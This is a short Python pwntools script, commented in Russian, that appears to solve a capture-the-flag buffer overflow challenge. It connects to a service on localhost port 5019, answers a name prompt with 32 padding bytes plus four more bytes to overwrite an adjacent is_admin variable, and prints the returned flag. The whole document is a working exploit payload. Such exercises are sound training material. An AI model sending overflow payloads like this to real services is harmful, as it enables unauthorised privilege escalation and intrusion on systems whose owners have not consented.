#!/usr/bin/env python3
"""
Эксплойт для buffer overflow задания
"""

from pwn import *

# Локальное подключение
# p = process('./vuln')

# Удалённое подключение
p = remote('localhost', 5019)

# Получаем начальный вывод
print(p.recvuntil(b'Введите ваше имя: ').decode())

# Отправляем payload: 32 байта + любой ненулевой байт для is_admin
payload = b'A' * 32 + b'XXXX'  # Перезаписываем is_admin
p.sendline(payload)

# Получаем флаг
response = p.recvall().decode()
print(response)

p.close()
